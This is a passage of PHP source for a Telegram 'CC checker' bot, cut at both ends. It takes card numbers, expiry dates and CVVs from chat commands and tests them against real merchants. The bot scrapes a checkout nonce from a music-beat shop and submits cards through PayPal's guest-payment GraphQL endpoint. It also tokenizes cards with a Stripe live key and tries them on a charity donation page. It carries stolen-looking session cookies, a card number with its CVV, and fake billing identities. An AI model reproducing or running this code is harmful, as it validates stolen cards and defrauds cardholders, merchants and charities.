    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Charged ($20)\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}




elseif((strpos($message, "!pp") === 0)||(strpos($message, "/pp") === 0)||(strpos($message, ".pp") === 0)){

$lista = substr($message, 4);
//$i     = explode("|", $lista);

$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = trim(substr($i[2], -2));
$ano1  = $i[2];
$cvv   = $i[3];

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
//$ma = "$mes+%2F+$ano";

////
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /pp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !pp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .pp cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}


//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin
//SACA EL NONCE1//////////NONCE//////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://dream-beat.com/checkout/',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_COOKIE => '__stripe_mid=899f6f18-ce27-4e83-b4a9-cfb2876ed564823b3c; wordpress_logged_in_16be603727c326eebbb2512f82748386=bivix38912%7C1731620209%7CS17huKXg8ffumjbUd9XF6Af5TkY9hcO40E8uBzV8K1P%7Ca9b70d6cefb040188b7fd77817ab08a241cf24d5c174d2a05fa553cc25692acb; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-04%2018%3A48%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-11-04%2018%3A48%3A58%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; woodmart_recently_viewed_products=15622; woocommerce_items_in_cart=1; wp_woocommerce_session_16be603727c326eebbb2512f82748386=78%7C%7C1730919051%7C%7C1730915451%7C%7Cd918bdddcd185a1b94b6d28930184bff; woocommerce_cart_hash=c4886a179fb1b6412f86234f994d7bdc; woodmart_wishlist_count=0; sbjs_session=pgs%3D22%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fwishlist%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua-platform: "Android"',
    'referer: https://dream-beat.com/wishlist/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);

// Expresión regular para encontrar el nonce de create_order
$patron = '/"create_order":\{"endpoint":.*?"nonce":"([a-f0-9]+)"/';
// Buscar coincidencia
preg_match($patron, $response, $coincidencia);
// Extraer valor
$nonce = $coincidencia[1];
curl_close($curl);


//////TOKEN/////
$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://dream-beat.com?wc-ajax=ppc-create-order',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"nonce":"'.$nonce.'","payer":{"email_address":"bivix38912@rinseart.com","name":{"surname":"Perez","given_name":"Carlos"},"address":{"country_code":"US","address_line_1":"6195 bollinger rd","address_line_2":"","admin_area_1":"AZ","admin_area_2":"New york","postal_code":"10010"},"phone":{"phone_type":"HOME","phone_number":{"national_number":"4179204022"}}},"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-card-button-gateway","funding_source":"card","form_encoded":"wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fdream-beat.com%2Fwishlist%2F&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fdream-beat.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-11-04+21%3A01%3A02&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F130.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=US&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=AZ&billing_postcode=10010&billing_phone=4179204022&billing_email=bivix38912%40rinseart.com&ship_to_different_address=1&shipping_first_name=Carlos&shipping_last_name=Perez&shipping_company=&shipping_country=US&shipping_address_1=6195+bollinger+rd&shipping_address_2=&shipping_city=New+york&shipping_state=AZ&shipping_postcode=10010&shipping_phone=4179204022&order_comments=&shipping_method%5B0%5D=flat_rate%3A4&payment_method=ppcp-card-button-gateway&woocommerce-process-checkout-nonce=a06e2df2eb&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}',
  CURLOPT_COOKIE => '__stripe_mid=899f6f18-ce27-4e83-b4a9-cfb2876ed564823b3c; wordpress_logged_in_16be603727c326eebbb2512f82748386=bivix38912%7C1731620209%7CS17huKXg8ffumjbUd9XF6Af5TkY9hcO40E8uBzV8K1P%7Ca9b70d6cefb040188b7fd77817ab08a241cf24d5c174d2a05fa553cc25692acb; wp_woocommerce_session_16be603727c326eebbb2512f82748386=78%7C%7C1730919051%7C%7C1730915451%7C%7Cd918bdddcd185a1b94b6d28930184bff; woodmart_wishlist_count=0; woocommerce_items_in_cart=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-11-04%2021%3A01%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fwishlist%2F; sbjs_first_add=fd%3D2024-11-04%2021%3A01%3A02%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fwishlist%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F130.0.0.0%20Mobile%20Safari%2F537.36; woocommerce_cart_hash=c4886a179fb1b6412f86234f994d7bdc; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'referer: https://dream-beat.com/checkout/',
  ],
]);


$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$token = $json['data']['id'];
curl_close($curl);




///CHECKOUT////
$palabras_originales = array("TOKEN", "CC", "ANO", "CVV");
$palabras_nuevas = array($token ,$cc, $ma, $cvv);
$texto = '{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput!\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n        ) {\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n            ) {\\n                flags {\\n                    is3DSecureRequired\\n                }\\n                cart {\\n                    intent\\n                    cartId\\n                    buyer {\\n                        userId\\n                        auth {\\n                            accessToken\\n                        }\\n                    }\\n                    returnUrl {\\n                        href\\n                    }\\n                }\\n                paymentContingencies {\\n                    threeDomainSecure {\\n                        status\\n                        method\\n                        redirectUrl {\\n                            href\\n                        }\\n                        parameter\\n                    }\\n                }\\n            }\\n        }\\n        ","variables":{"token":"TOKEN","card":{"cardNumber":"CC","type":"VISA","expirationDate":"ANO","postalCode":"10010","securityCode":"CVV"},"firstName":"Carlos","lastName":"Perez","billingAddress":{"givenName":"Carlos","familyName":"Perez","line1":"6195 bollinger rd","line2":null,"city":"New york","state":"AZ","postalCode":"10010","country":"US"},"email":"bivix38912@rinseart.com","currencyConversionType":"PAYPAL"},"operationName":null}';

$data = str_replace($palabras_originales, $palabras_nuevas, $texto);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://www.paypal.com/graphql?fetch_credit_form_submit=',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => $data,
//  CURLOPT_POSTFIELDS => '{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput!\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n        ) {\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n            ) {\\n                flags {\\n                    is3DSecureRequired\\n                }\\n                cart {\\n                    intent\\n                    cartId\\n                    buyer {\\n                        userId\\n                        auth {\\n                            accessToken\\n                        }\\n                    }\\n                    returnUrl {\\n                        href\\n                    }\\n                }\\n                paymentContingencies {\\n                    threeDomainSecure {\\n                        status\\n                        method\\n                        redirectUrl {\\n                            href\\n                        }\\n                        parameter\\n                    }\\n                }\\n            }\\n        }\\n        ","variables":{"token":"4CN918618N9014811","card":{"cardNumber":"4347690261257028","type":"VISA","expirationDate":"11/2025","postalCode":"10010","securityCode":"245"},"firstName":"Carlos","lastName":"Perez","billingAddress":{"givenName":"Carlos","familyName":"Perez","line1":"6195 bollinger rd","line2":null,"city":"New york","state":"AZ","postalCode":"10010","country":"US"},"email":"bivix38912@rinseart.com","currencyConversionType":"PAYPAL"},"operationName":null}',
//  CURLOPT_COOKIE => 'ts_c=vr%3Df8fd5f0d1920a798184655fcfecd84a4%26vt%3Df8fd5f0d1920a798184655fcfecd84a3; rssk=d%7DC9%4093%3C%3A82%3D68B%3B%3Exqx%3E%3Fgyu%3Ak%7F%3E%3F10; enforce_policy=ccpa; nsid=s%3AiQJUjQtlc01CRBkLLTbfOo162CXXXgto.SnJWHSZ1BYgQBKeubCjw49OKBWvgkTmWdIBfPxzG%2FP0; KHcl0EuY7AKSMgfvHl7J5E7hPtK=nEWEN5BnkPljmgdYFT5zu9yflPyctLHMWNYqQKBFHACQowrrCownPlVg_vJPwo8rk7tiLMTXIe___AWI; ddi=KnBCeYG4uWvAvIMOZgWojdVSdjduzanbGR-5ctKjouRNx2Zp238tJ3IfIVE746ZJrDNnZqz5IgfL8Il6KSe6-9gbJHDIgHb3txo06iu1VqxrnzJ_; sc_f=hKuj5WPUdnJqsetyQYRZRy60O-WIFGTvPHnYuENoP78W63M_yzFDtYRgIwVMKYQ2AhuuGg_ZHVzDJygf6L6UIcRe68ArJgZUuWfH6W; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAPWOQoJg2I0ZNN34mLR0idY1u7sDGy5b9t71Zi9S4CBmR0as-Tcex44Y4OL6bVG4B5GFMEjzRRpzLFPWO0mF4pEIT_pxg; login_email=xipay59414%40bulatox.com; LANG=en_US%3BUS; l7_az=dcg16.slc; tsrce=xobuyernodeserv; x-pp-s=eyJ0IjoiMTczMDc1NDUzMDczMCIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1825358930%26vteXpYrS%3D1730756330%26vr%3Df8fd5f0d1920a798184655fcfecd84a4%26vt%3Df8fd5f0d1920a798184655fcfecd84a3%26vtyp%3Dnew',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/json',
    'sec-ch-ua-platform: "Android"',
    'paypal-client-context: 4CN918618N9014811',
    'x-app-name: standardcardfields',
    'paypal-client-metadata-id: 4CN918618N9014811',
    'x-country: US',
    'origin: https://www.paypal.com',
    'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_9551e72314_mje6mde6mdq&buttonSessionID=uid_687cc5ee38_mje6mdc6mtk&locale.x=en_US&commit=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFIZHNiMThlRW5hLXFNcVNTRk9zV3BkTUpBMmRleUtNdTBaYlZQUXhhbUttdTE3blpJR3gyd21aMUhzQXoycFBWM0dSdDRhTWtBMHpGQ2wmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wNC0wMyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciZsb2NhbGU9ZW5fVVMiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJXb29fUFBDUCIsImRhdGEtdWlkIjoidWlkX3J2dHBvbXZycGp6eHVvc2tnc3Z6amJjd25yZXd6ZiJ9fQ&disable-card=&token=4CN918618N9014811',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
//$respo = $json['errors'][0]['data'][0]['code'];
//$mensaje = $json['errors'][0]['message'];
curl_close($curl);
	
// Verifica si hay errores
if (isset($json['errors'])) {

   if (isset($json['errors'][0]['data'][0]['code'])){
       $respo = $json['errors'][0]['data'][0]['code'];

   } elseif (isset($json['errors'][0]['message'])){
       $respo = $json['errors'][0]['message'];
   }

} elseif (isset($json['data']['approveGuestPaymentWithCreditCard']) && $json['data']['approveGuestPaymentWithCreditCard'] !== null) {
    // Requerimiento de 3DS
    if (isset($json['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) && $json['data']['approveGuestPaymentWithCreditCard']['flags']['is3DSecureRequired']) {
        $respo = "3DS authentication is required.";
    }

    // Estado del pago
    if (isset($json['data']['approveGuestPaymentWithCreditCard']['status'])) {
        if ($json['data']['approveGuestPaymentWithCreditCard']['status'] == 'approved') {
            $respo = "Pago aprobado con éxito. ID: " . $json['data']['approveGuestPaymentWithCreditCard']['id'];
        } else {
            $respo = "Pago rechazado";
        }
    }
} else {
$respo = $response;
}
	
	
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";



/*
if (empty($respo)) {
$respo = $response;
} else {
$respo = $respo;
}
*/

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración
if (array_in_string($respo, $live_array)) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = True;
} elseif (strpos($respo, 'CARD_GENERIC_ERROR') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
    $live = False;
} else {
    $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: GATE ERROR ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: Paypal\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: PROXY DEAD ❌\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━•么•━━━━━━━━━━\n";
    $live = False;
}

if ($live) {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
} else {
    //echo "$respuesta\n";
    editMessage($chat_id, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


}

















// Checking CC's Commands
elseif((strpos($message, "!stp") === 0)||(strpos($message, "/stp") === 0)||(strpos($message, ".stp") === 0)){

$lista = substr($message, 5);
//$i     = explode("|", $lista);
$i = preg_split('/[|:| ]/', $lista);
$cc    = $i[0];
$mes   = $i[1];
$ano  = $i[2];
$cvv   = $i[3];
/*function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};*/

$bin = substr($lista, 0, 6);
////
$num = "$cc$mes$ano$cvv";
//-----------------------------------------------------//
$verify = substr($cc, 16, 1);
if($verify != ""){
$respuesta = "🚫ᴄᴄ ɴᴏ ᴠᴀʟɪᴅᴀ🚫\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//-----------------------------------------------------//
if(is_numeric($num) && $lista != '' && $cc != '' && $mes != '' && $ano != '' && $cvv != ''){
}else{
$respuesta = "━━━━━━•⟮ɢᴀᴛᴇᴡᴀʏ sᴛʀɪᴘᴇ⟯•━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 2: !stp cc|m|y|cvv\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 3: .stp cc|m|y|cvv\n";
sendMessage($chat_id,$respuesta, $message_id);
die();
}

//----------------MENSAGE DE ESPERA-------------------//
$respuesta = "<b>🕒 Wait for Result...</b>";
sendMessage($chat_id,$respuesta, $message_id);
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//
$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin

////RANDOM USER//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$get = curl_exec($ch);
curl_close($ch);
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];

////SACA EL TOKEN//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F3d0d0fc67%3B+stripe-js-v3%2F3d0d0fc67&time_on_page=63244&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb&pasted_fields=number');
$result = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getstr($result,'id": "','"')));
$ip = trim(strip_tags(getstr($result,'client_ip": "','"')));
//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://goodbricksapp.com/icsd.org/donate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
